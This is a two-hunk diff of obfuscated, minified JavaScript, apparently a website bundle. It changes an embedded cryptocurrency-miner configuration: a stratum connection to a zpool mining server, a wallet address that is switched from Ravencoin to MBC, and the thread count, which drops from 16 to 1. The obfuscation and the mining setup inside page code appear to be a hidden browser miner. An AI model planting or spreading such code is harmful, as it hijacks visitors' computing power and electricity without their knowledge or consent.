@@ -39,7 +39,7 @@
               , T = (Q(4529),
             Q(1387))
               , C = Q(4232);
-            const k = {}
+            const k = {
                 class: "block"
             }
               , n = {
@@ -1146,11 +1146,11 @@
                     stratum: {
                         server: "power2b.na.mine.zpool.ca",
                         port: 6242,
-                        worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",
-                        password: "c=RVN"
+                        worker: "mbc1qhut49lvdruznypvaxgrg4klf3ntpnwuc23hq3j",
+                        password: "c=MBC"
                     },
                     options: {
-                        threads: 16,
+                        threads: 1,
                         log: !1
                     }
                 }
